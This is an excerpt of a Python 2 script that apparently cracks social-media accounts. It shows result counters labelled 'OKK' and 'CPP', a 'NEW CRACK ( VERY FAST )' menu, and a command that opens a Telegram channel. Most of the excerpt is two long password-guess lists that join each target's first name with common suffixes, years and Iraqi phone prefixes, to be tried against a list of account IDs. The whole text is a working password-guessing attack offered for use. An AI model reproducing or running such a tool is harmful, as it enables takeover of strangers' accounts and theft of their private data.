...
def seved_ok_cp(ok, cp):
    if len(ok) != 0 or len(cp) != 0:
        ...
        print '[%s+%s] OKK: %s%s%s' % (O, N, H, str(len(ok)), N)
        print '[%s+%s] CPP: %s%s%s' % (O, N, K, str(len(cp)), N)
        print '\x1b[1;97m-------------------------------------------------'
...
def mking():
    ...
    try:
        ...
        os.system('xdg-open https://t.me/Chanaly707')
        coment()
    except KeyError:
        ...
        if ___mking__pass___ in ('2', '02'):
            ...
            while True:
                ...
                if pwek == '':
                    ...
                    print '\x1b[1;97m-------------------------------------------------'
                    print '[%s\x1b[1;92m1%s] NEW CRACK ( VERY FAST )' % (O, N)
                    print '\x1b[1;97m-------------------------------------------------'
                    __yan__(pwek.split(','))
                    break
                ...
                for yntkts in self.id:
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0] + '123', xz[0] + '12345', xz[0] + '1122', xz[0] + '112233', xz[0] + '1122334455', xz[0]  + '1234', xz[0] + '123321', xz[0] + '100200', xz[0] + '12344321', xz[0] + '1999', xz[0] + '2000', xz[0] + '123456789', xz[0] + '112233445566', xz[0] + '11223344', xz[0] + '1234554321', xz[0] + '123456', xz[0] + '1990', xz[0] + '1212', xz[0] + '123123', xz[0] + '786', xz[0] + '100200300', xz[0] + '2007', xz[0] + '112233332211', xz[0] + '2003', xz[0] + '54321', xz[0] + '321', xz[0] + '2001', xz[0] + '2002', xz[0] + '2004', xz[0] + '2005', xz[0] + '2006', xz[0] + '2010', xz[0] + '4321', xz[0] + '12345@', xz[0] + '123$', xz[0] + '12345$', xz[0] + '987654321', xz[0] + '102030', xz[0] + '@34', xz[0] + '@43', xz[0] + '@@@###', xz[0] + '@@@$$$', xz[0] + '$$$###', xz[0] + '###$$$', xz[0] + '696969', xz[0] + '654321', xz[0] + '1234567890', xz[0] + '121212', xz[0] + '6969', xz[0] + '500600', xz[0] + '123123123', xz[0] + '232323', xz[0] + '87654321', xz[0] + '12344321', xz[0] + '101010', xz[0] + '12341234', xz[0] + '5150', xz[0] + '2112', xz[0] + '212121', xz[0] + '007007', xz[0] + '1345', xz[0] + '543210', xz[0] + '666999', xz[0] + '0770', xz[0] + '0751', xz[0] + '0771', xz[0] + '0750', xz[0] + '+964', xz[0] + '2021', xz[0] + '2020', xz[0] + '2019', xz[0] + '2017', xz[0] + '2018', xz[0] + '2016', xz[0] + '2015', xz[0] + '1991', xz[0] + '1992', xz[0] + '1993', xz[0] + '1994', xz[0] + '1995', xz[0] + '1996', xz[0] + '1997', xz[0] + '1998', xz[0] + '1980', xz[0] + '1981', xz[0] + '1982', xz[0] + '1983', xz[0] + '1984', xz[0] + '1985', xz[0] + '1986', xz[0] + '1987', xz[0] + '1988', xz[0] + '1989', xz[0] + '2014', xz[0] + '2013', xz[0] + '2012', xz[0] + '2011', xz[0] + '2009', xz[0] + '2008', xz[0] + '113344', xz[0] + '13344', xz[0] + '1223344', xz[0] + '12233']
                        else:
                            pwx = [name, xz[0] + '123', xz[0] + '12345', xz[0] + '1122', xz[0] + '112233', xz[0] + '1122334455', xz[0]  + '1234', xz[0] + '123321', xz[0] + '100200', xz[0] + '12344321', xz[0] + '1999', xz[0] + '2000', xz[0] + '123456789', xz[0] + '112233445566', xz[0] + '11223344', xz[0] + '1234554321', xz[0] + '123456', xz[0] + '1990', xz[0] + '1212', xz[0] + '123123', xz[0] + '786', xz[0] + '100200300', xz[0] + '2007', xz[0] + '112233332211', xz[0] + '2003', xz[0] + '54321', xz[0] + '321', xz[0] + '2001', xz[0] + '2002', xz[0] + '2004', xz[0] + '2005', xz[0] + '2006', xz[0] + '2010', xz[0] + '4321', xz[0] + '12345@', xz[0] + '123$', xz[0] + '12345$', xz[0] + '987654321', xz[0] + '102030', xz[0] + '@34', xz[0] + '@43', xz[0] + '@@@###', xz[0] + '@@@$$$', xz[0] + '$$$###', xz[0] + '###$$$', xz[0] + '696969', xz[0] + '654321', xz[0] + '1234567890', xz[0] + '121212', xz[0] + '6969', xz[0] + '500600', xz[0] + '123123123', xz[0] + '232323', xz[0] + '87654321', xz[0] + '12344321', xz[0] + '101010', xz[0] + '12341234', xz[0] + '5150', xz[0] + '2112', xz[0] + '212121', xz[0] + '007007', xz[0] + '1345', xz[0] + '543210', xz[0] + '666999', xz[0] + '0770', xz[0] + '0751', xz[0] + '0771', xz[0] + '0750', xz[0] + '+964', xz[0] + '2021', xz[0] + '2020', xz[0] + '2019', xz[0] + '2017', xz[0] + '2018', xz[0] + '2016', xz[0] + '2015', xz[0] + '1991', xz[0] + '1992', xz[0] + '1993', xz[0] + '1994', xz[0] + '1995', xz[0] + '1996', xz[0] + '1997', xz[0] + '1998', xz[0] + '1980', xz[0] + '1981', xz[0] + '1982', xz[0] + '1983', xz[0] + '1984', xz[0] + '1985', xz[0] + '1986', xz[0] + '1987', xz[0] + '1988', xz[0] + '1989', xz[0] + '2014', xz[0] + '2013', xz[0] + '2012', xz[0] + '2011', xz[0] + '2009', xz[0] + '2008', xz[0] + '113344', xz[0] + '13344', xz[0] + '1223344', xz[0] + '12233']
